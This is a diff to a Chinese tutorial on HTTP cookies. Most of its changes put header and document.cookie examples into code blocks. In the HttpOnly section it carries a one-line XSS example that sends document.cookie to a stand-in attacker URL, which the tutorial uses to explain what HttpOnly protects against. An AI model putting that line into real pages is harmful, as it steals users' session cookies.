@@ -48,7 +48,9 @@ document.cookie;
 
 服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个 `Set-Cookie` 字段。
 
-`Set-Cookie:foo=bar`
+```sh
+Set-Cookie:foo=bar
+```
 
 上面代码会在浏览器保存一个名为 `foo` 的 Cookie，它的值为 `bar`。
 
@@ -76,29 +78,41 @@ Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
 
 一个 `Set-Cookie` 字段里面，可以同时包括多个属性，没有次序的要求。
 
-`Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly`
+```sh
+Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
+```
 
 下面是一个例子。
 
-`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly`
+```sh
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+```
 
 如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的 `key`、`domain`、`path` 和 `secure` 都匹配。
 
 举例来说，如果原始的 `Cookie` 是用如下的 `Set-Cookie` 设置的。
 
-`Set-Cookie: key1=value1; domain=example.com; path=/blog`
+```sh
+Set-Cookie: key1=value1; domain=example.com; path=/blog
+```
 
 改变上面这个 `Cookie` 的值，就必须使用同样的 `Set-Cookie`。
 
-`Set-Cookie: key1=value2; domain=example.com; path=/blog`
+```sh
+Set-Cookie: key1=value2; domain=example.com; path=/blog
+```
 
 只要有一个属性不同，就会生成一个全新的 `Cookie`，而不是替换掉原来那个 `Cookie`。
 
-`Set-Cookie: key1=value2; domain=example.com; path=/`
+```sh
+Set-Cookie: key1=value2; domain=example.com; path=/
+```
 
 上面的命令设置了一个全新的同名 `Cookie`，但是 `path` 属性不一样。下一次访问 `example.com/blog` 的时候，浏览器将向服务器发送两个同名的 `Cookie`。
 
-`Cookie: key1=value1; key1=value2`
+```sh
+Cookie: key1=value1; key1=value2
+```
 
 上面代码的两个 `Cookie` 是同名的，匹配越精确的 `Cookie` 排在越前面。
 
@@ -106,13 +120,17 @@ Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
 
 浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 `Cookie`。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的 `Cookie` 字段。
 
-`Cookie: foo=bar`
+```sh
+Cookie: foo=bar
+```
 
 上面代码会向服务器发送名为 `foo` 的 `Cookie`，值为 `bar`。
 
 `Cookie` 字段可以包含多个 `Cookie`，使用分号（`;`）分隔。
 
-`Cookie: name=value; name2=value2; name3=value3`
+```sh
+Cookie: name=value; name2=value2; name3=value3
+```
 
 下面是一个例子。
 
@@ -131,9 +149,11 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 
 ### 3.1.`Expires`，`Max-Age`
 
-`Expires` 属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 `Cookie`。它的值是 UTC 格式，可以使用 `Date.prototype.toUTCString()` 进行格式转换。
+`Expires` 属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 `Cookie`。它的值是 UTC 格式，可以使用 `Date.prototype.toUTCString` 进行格式转换。
 
-`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`
+```sh
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+```
 
 如果不设置该属性，或者设为 `null`，`Cookie` 只在当前会话（`session`）有效，浏览器窗口一旦关闭，当前 `Session` 结束，该 `Cookie` 就会被删除。另外，浏览器根据本地时间，决定 `Cookie` 是否过期，由于本地时间是不精确的，所以没有办法保证 `Cookie` 一定会在服务器指定的时间过期。
 
@@ -155,7 +175,9 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 
 `HttpOnly` 属性指定该 `Cookie` 无法通过 JavaScript 脚本拿到，主要是 `Document.cookie` 属性、`XMLHttpRequest` 对象和 `Request API` 都拿不到该属性。这样就防止了该 `Cookie` 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 `Cookie`。
 
-`(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;`
+```js
+(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+```
 
 上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 `Cookie` 发往第三方服务器。如果设置了一个 `Cookie` 的 `HttpOnly` 属性，上面代码就不会读到该 `Cookie`。
 
@@ -165,7 +187,9 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 
 读取的时候，它会返回当前网页的所有 `Cookie`，前提是该 `Cookie` 不能有 `HTTPOnly` 属性。
 
-`document.cookie // "foo=bar;baz=bar"`
+```js
+document.cookie // "foo=bar;baz=bar"
+```
 
 上面代码从 `document.cookie` 一次性读出两个 `Cookie`，它们之间使用分号分隔。必须手动还原，才能取出每一个 `Cookie` 的值。
 
@@ -181,7 +205,9 @@ for (var i = 0; i < cookies.length; i++) {
 
 `document.cookie` 属性是可写的，可以通过它为当前网站添加 `Cookie`。
 
-`document.cookie = 'fontSize=14';`
+```js
+document.cookie = 'fontSize=14';
+```
 
 写入的时候，`Cookie` 的值必须写成 `key=value` 的形式。注意，等号两边不能有空格。另外，写入 `Cookie` 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 `Cookie` 的值），这可以用 `encodeURIComponent` 方法达到。
 
@@ -198,7 +224,9 @@ document.cookie;
 
 写入 `Cookie` 的时候，可以一起写入 `Cookie` 的属性。
 
-`document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";`
+```js
+document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
+```
 
 上面代码中，写入 `Cookie` 的时候，同时设置了 `expires` 属性。属性值的等号两边，也是不能有空格的。
 
@@ -225,6 +253,8 @@ document.cookie =
 
 删除一个现存 `Cookie` 的唯一方法，是设置它的 `expires` 属性为一个过去的日期：
 
-`document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';`
+```js
+document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
+```
 
 上面代码中，名为 `fontSize` 的 `Cookie` 的值为空，过期时间设为 1970 年 1 月 1 月零点，就等同于删除了这个 `Cookie`。
